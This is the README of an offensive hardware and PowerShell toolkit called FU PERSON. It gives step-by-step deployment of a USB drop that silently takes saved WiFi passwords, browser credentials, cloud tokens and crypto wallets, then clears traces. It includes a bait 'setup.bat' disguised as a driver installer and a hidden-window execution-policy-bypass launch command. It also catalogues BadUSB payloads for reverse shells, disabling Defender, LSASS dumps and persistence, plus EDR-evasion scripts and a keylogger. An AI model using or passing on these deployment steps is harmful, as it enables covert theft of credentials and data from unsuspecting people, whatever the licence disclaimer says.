<div align="center">

# FU PERSON v2.0

```
    ███████╗██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
    ██╔════╝██║   ██║    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
    █████╗  ██║   ██║    ██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
    ██╔══╝  ██║   ██║    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
    ██║     ╚██████╔╝    ██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
    ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Integrated Security Operations Platform**

[![Version](https://img.shields.io/badge/Version-2.0-00FFFF?style=for-the-badge)]()
[![PowerShell](https://img.shields.io/badge/Engine-PowerShell-FF00FF?style=for-the-badge)]()
[![Dependencies](https://img.shields.io/badge/Dependencies-ZERO-00FF88?style=for-the-badge)]()
[![FLLC](https://img.shields.io/badge/FLLC-2026-7B2FBE?style=for-the-badge)]()

</div>

---

> Five devices. One objective. Everything automated where it can be. Everything manual where it must be.

```
Property of FLLC | Source-Available | Authorized Use Only
```

---

## The Arsenal

| Device | Role | Automation |
|--------|------|------------|
| **USB Tri-Drive (SD + MicroSD)** | Data extraction + OSINT + network recon | **Fully automated** — insert and walk away |
| **Flipper Zero** | RF/NFC/IR/BadUSB field operations | **Manual** — you operate it |
| **ESP32 DevKit V1.1** | WiFi wardriving + BLE scanning | **Standalone** — plugs into tri-drive or runs solo |
| **Galaxy S20+** | Headless pentest platform (screen broken, ADB only) | **ADB controlled** — no screen needed |
| **Nintendo DSi** | Homebrew + WiFi recon | **Manual** — standalone handheld |

---

## 1. USB TRI-DRIVE (The Main Weapon)

**Everything is PowerShell. Zero dependencies. Works on any Windows PC since 2009.**

### What It Does

Insert the USB tri-drive. One script silently extracts everything from the target PC and dumps it to the MicroSD card.

| Phase | What Gets Extracted |
|-------|---------------------|
| 1 | System info, users, admins, processes, services, AV status, USB history |
| 2 | IP config, ARP, connections, routes, DNS cache, shares, firewall, domain info |
| 3 | **Every saved WiFi password** (SSID + plaintext key) |
| 4 | Browser data from **7 browsers** (logins, cookies, history, bookmarks) + DPAPI keys |
| 5 | Credential Manager, RDP sessions, PuTTY, SSH keys, AWS/Azure/GCP tokens, Git creds |
| 6 | Discord, Telegram, Slack, Teams, Signal, VPN configs, Thunderbird, FileZilla, WinSCP |
| 7 | Password grep, .env files, recent docs, KeePass DBs, certificates, Sticky Notes |
| 8 | 11 crypto wallets (Exodus, MetaMask, Phantom, Bitcoin Core...) + seed phrase search |
| 9 | Priv esc recon (unquoted paths, writable dirs, autologon, DLL hijack opportunities) |
| 10 | Full screenshot + clipboard text |
| 11 | Trace cleanup (PS history, Run dialog MRU, prefetch) |

**Time: ~60 seconds. Output: `MicroSD:\loot\HOSTNAME_TIMESTAMP\`**

### How To Deploy (5 minutes, one time)

**Step 1** — Run `usb_payload\DEPLOY.bat` on YOUR PC. This copies:
- **SD card** gets `setup.bat` (social engineering trigger) + hidden `.p\` folder with all tools
- **MicroSD** gets `.loot_target` marker + `loot\` directory

**Step 2** — Insert the USB tri-drive into the target PC.

**Trigger options:**
- **Flipper Zero BadUSB** — Types the launch command in 2 seconds. Zero-click. (copy `usb_payload\flipper_badusb\usb_harvest.txt` to Flipper)
- **Social engineering** — Target sees `setup.bat` labeled as "USB 3.0 Driver Setup" and clicks it
- **Manual** — Open PowerShell, run: `powershell -NoP -W Hidden -Exec Bypass -File "H:\.p\harvest.ps1"`

**Step 3** — Walk away. Retrieve MicroSD later. All data is in `loot\`.

### Interactive Tools (also on the SD card)

The SD card also contains tools you can run interactively from the target PC:

```
.p\launcher.ps1  — Master menu (launches everything below)
.p\osint.ps1     — People/phone/email/domain/IP lookup
.p\recon.ps1     — Port scanning, host discovery, WiFi analysis, shares
.p\harvest.ps1   — Silent data extraction (auto or manual)
```

Run the launcher: `powershell -Exec Bypass -File "H:\.p\launcher.ps1"`

### OSINT Capabilities (PowerShell, no installs needed)

| Feature | Details |
|---------|---------|
| **Person lookup** | 12 people search engines + social media enumeration (14 platforms) |
| **Reverse phone** | 9 reverse phone databases |
| **Reverse email** | 8 email lookup services + MX record check |
| **Domain recon** | DNS (A/AAAA/MX/NS/TXT/SOA) + 50 subdomain brute-force + OSINT URLs |
| **IP lookup** | GeoIP + reverse DNS + Shodan/Censys/AbuseIPDB links |
| **Public records** | Court records, SEC filings, FEC donations, patents, corporate filings |
| **Breach data** | HaveIBeenPwned, DeHashed, IntelX, LeakCheck links |

### Network Recon Capabilities (PowerShell, no installs needed)

| Feature | Details |
|---------|---------|
| **Port scanner** | Async, 100+ threads, top 100 ports, service fingerprinting |
| **Host discovery** | ARP + ICMP sweep, auto-detect subnet, MAC + hostname resolution |
| **WiFi analysis** | All saved passwords + nearby networks + current connection details |
| **Share enumeration** | SMB shares, common admin shares (C$, ADMIN$), mapped drives |
| **Full auto recon** | Runs everything above, saves to MicroSD |

---

## 2. FLIPPER ZERO (Standalone Field Tool)

The Flipper is your hands-on operations device. **You control it. It does not auto-launch.**

### BadUSB Arsenal (35+ payloads ready to go)

Copy the `flipper/badusb/` folder to your Flipper Zero SD card.

| Payload | What It Does |
|---------|-------------|
| `wifi_passwords.txt` | Dumps all saved WiFi passwords |
| `rapid_exfil.txt` | Fast system info exfiltration |
| `credential_dump.txt` | Windows Credential Manager dump |
| `browser_harvest.txt` | Browser data extraction |
| `sam_dump.txt` | SAM/SYSTEM registry hive copy |
| `reverse_shell.txt` | PowerShell reverse shell |
| `net_diag.txt` | Base64 encoded reverse shell (AV bypass) |
| `disable_defender.txt` | Disable Windows Defender |
| `rdp_enable.txt` | Enable Remote Desktop |
| `persistence_install.txt` | Install persistent backdoor |
| `ad_enum.txt` | Active Directory enumeration |
| `cloud_creds.txt` | Cloud credential harvesting |
| `crypto_wallet.txt` | Crypto wallet extraction |
| `uac_bypass.txt` | UAC bypass |
| `lsass_dump.txt` | LSASS memory dump |
| ...and 20+ more | See `flipper/badusb/` |

### Other Flipper Modules

| Module | Location | Content |
|--------|----------|---------|
| **Sub-GHz** | `flipper/subghz/` | Frequency database, garage codes, IoT devices, protocol reference |
| **NFC** | `flipper/nfc/` | Mifare keys, NDEF payloads, card formats, EMV reference, attack playbook |
| **Infrared** | `flipper/infrared/` | Universal remotes: TV, AC, soundbar, projector, fan, LED, STB |
| **RFID** | `flipper/rfid/` | Format database for all common RFID systems |
| **iButton** | `flipper/ibutton/` | Type database |
| **GPIO** | `flipper/gpio/` | ESP32 Marauder commands, BLE attacks, advanced recon |

Full tactical guide: `flipper/FLIPPER_PLAYBOOK.md`

---

## 3. ESP32 DevKit V1.1 (WiFi/BLE Wardriver)

DIYMalls ESP32 DevKit V1.1 firmware for WiFi and BLE reconnaissance.

| Feature | Details |
|---------|---------|
| WiFi scanning | Channel hopping, SSID/BSSID/signal/encryption logging |
| Deauth detection | Detect deauthentication attacks in progress |
| Probe capture | Log device probe requests (reveals hidden SSIDs devices look for) |
| BLE scanning | Discover Bluetooth LE devices in range |
| Evil Twin | Clone an AP for credential harvesting |
| Beacon spam | Flood area with fake SSIDs |
| PMKID capture | WPA handshake-free password attack material |
| SD card logging | All data logged to MicroSD in PCAP/JSON format |

**Firmware:** `firmware/esp32/FLLC_wardriver/`
**Flash tool:** `firmware/esp32/flash_esp32.py`
**Pin config:** `firmware/esp32/FLLC_wardriver/config.h` (set for DIYMalls V1.1)

---

## 4. GALAXY S20+ (Headless, No Screen)

**The screen is broken. Everything is ADB over USB.**

### Setup

```bash
# Connect via USB, enable ADB (must be pre-enabled)
adb devices

# Install Termux
adb install termux.apk

# Push setup script
adb push mobile/s20_headless/setup_termux.sh /sdcard/
adb push mobile/s20_headless/magisk_setup.sh /sdcard/

# Run setup inside Termux
adb shell am start -n com.termux/.HomeActivity
adb shell input text 'bash /sdcard/setup_termux.sh'
adb shell input keyevent 66
```

### Capabilities (once set up)

| Feature | Script |
|---------|--------|
| Termux full setup | `mobile/s20_headless/setup_termux.sh` |
| Magisk root setup | `mobile/s20_headless/magisk_setup.sh` |
| WiFi attacks (Kali) | `mobile/s20_headless/wifi_attacks.sh` |
| Headless recon | `mobile/s20_headless/headless_recon.sh` |
| ADB remote control | `mobile/s20_headless/adb_control.py` |
| Screen mirror setup | `mobile/s20_headless/scrcpy_setup.bat` |

---

## 5. NINTENDO DSi (Homebrew)

Full jailbreak and homebrew setup guide: `mobile/dsi/DSI_FULL_SETUP.md`

Toolkit helper: `mobile/dsi/dsi_toolkit.py`

---

## Extended Modules

These are additional PowerShell scripts in `payloads/windows/` for advanced operations. They require more time and elevated privileges — not for quick USB drops, but for deeper engagements.

| Script | Purpose |
|--------|---------|
| `auto_pwn.ps1` | 15-phase master orchestrator (uses everything below) |
| `evasion.ps1` | AMSI/ETW/Defender bypass framework |
| `ai_evasion.ps1` | AI/ML EDR evasion (behavioral randomization, telemetry blinding) |
| `privesc.ps1` | Windows privilege escalation scanner |
| `persistence_engine.ps1` | 12-method persistence (WMI, COM hijack, DLL sideload, named pipes) |
| `cloud_harvester.ps1` | M365/Google/Azure/AWS token harvesting |
| `comms_harvester.ps1` | Teams/Slack/Discord/Signal data extraction |
| `crypto_hunter.ps1` | Wallet + seed phrase hunting |
| `compliance_scanner.ps1` | NIST/CIS/PCI/SOC2 audit scanner |
| `sqli_scanner.ps1` | SQL injection automation for local web services |
| `npp_exploit.ps1` | Notepad++ DLL hijack + config injection |
| `input_monitor.py` | Keystroke/screenshot logger (requires Python on target) |
| `linux_collector.sh` | Linux data collection (12-phase, cloud/container aware) |

---

## Laptop Tools (Python, for YOUR machine)

These run on your own computer. They need Python installed.

| Tool | What It Does |
|------|-------------|
| `core/pentest_suite.py` | Automated penetration testing |
| `core/osint_recon_suite.py` | OSINT reconnaissance |
| `core/galaxy_recon_suite.py` | Deep intelligence platform |
| `core/people_finder.py` | 88+ platform people search |
| `core/repo_collector.py` | GitHub repository data aggregation |
| `core/list_consolidator.py` | Wordlist consolidation engine |
| `core/data/` | Pre-consolidated master wordlists |

Setup: `pip install -r requirements.txt`

---

## Repository Structure

```
FU-PERSON/
|
|-- usb_payload/                    ** READY-TO-DEPLOY USB FILES **
|   |-- DEPLOY.bat                  One-click deployment to SD + MicroSD
|   |-- sd_card/                    -> Copy to SD card (H:)
|   |   |-- setup.bat              Social engineering trigger
|   |   |-- README.txt             Bait file
|   |   '-- .p/                    Hidden payload folder
|   |       |-- harvest.ps1        Silent 11-phase data extraction
|   |       |-- osint.ps1          People/phone/email/domain/IP lookup
|   |       |-- recon.ps1          Port scan, host discovery, WiFi, shares
|   |       '-- launcher.ps1       Master menu for all tools
|   |-- microsd/                   -> Copy to MicroSD (I:)
|   |   '-- .loot_target           Drive identification marker
|   '-- flipper_badusb/            -> Copy to Flipper Zero
|       '-- usb_harvest.txt        Zero-click auto-launch
|
|-- flipper/                        Flipper Zero standalone arsenal
|   |-- badusb/                    35+ BadUSB payloads
|   |-- subghz/                    Sub-GHz frequency data
|   |-- nfc/                       NFC attack resources
|   |-- infrared/                  Universal IR remotes
|   |-- rfid/                      RFID format database
|   |-- ibutton/                   iButton types
|   |-- gpio/                      ESP32 GPIO integration
|   '-- FLIPPER_PLAYBOOK.md        Full tactical guide
|
|-- firmware/esp32/                 ESP32 wardriver firmware
|   |-- FLLC_wardriver/            Arduino project
|   |-- platformio.ini             Build config
|   '-- flash_esp32.py             Flash utility
|
|-- mobile/
|   |-- s20_headless/              Galaxy S20+ (no screen, ADB only)
|   '-- dsi/                       Nintendo DSi homebrew
|
|-- payloads/                       Extended attack modules
|   |-- windows/                   15 PowerShell attack scripts
|   '-- linux/                     Linux collector
|
|-- core/                           Python tools (for your laptop)
|   |-- people_finder.py           88+ platform OSINT
|   |-- pentest_suite.py           Pentest automation
|   |-- osint_recon_suite.py       OSINT engine
|   '-- data/                      Consolidated wordlists
|
|-- docs/                           Documentation
|-- deploy/                         Legacy deployment scripts
|-- recorder/                       Voice-activated recorder
|
|-- LICENSE                         Source-Available License
|-- SECURITY.md                     Vulnerability disclosure
'-- CONTRIBUTING.md                 Contribution policy
```

---

## Quick Start

### USB Drop (automated extraction)

```
1. Run usb_payload\DEPLOY.bat          (deploys to SD + MicroSD)
2. Insert USB tri-drive into target     (or use Flipper BadUSB)
3. Retrieve MicroSD later               (data in loot\ folder)
```

### Interactive OSINT/Recon (from USB)

```
powershell -Exec Bypass -File "H:\.p\launcher.ps1"
```

### Flipper Zero

```
Copy flipper\ contents to Flipper SD card. Operate manually.
```

### Galaxy S20+ (headless)

```
adb connect. Push scripts. Execute via Termux. No screen needed.
```

---

## Legal

**FU PERSON Source-Available License v1.0** — Copyright 2025-2026 FLLC.

Authorized security testing only. Unauthorized computer access is a federal crime (18 U.S.C. 1030). You are solely responsible for legal compliance. Do not use against any system without explicit written authorization.

Contact: preston@fllc.net

---

<div align="center">

**FLLC** | 2026

*Insert. Extract. Retrieve.*

</div>
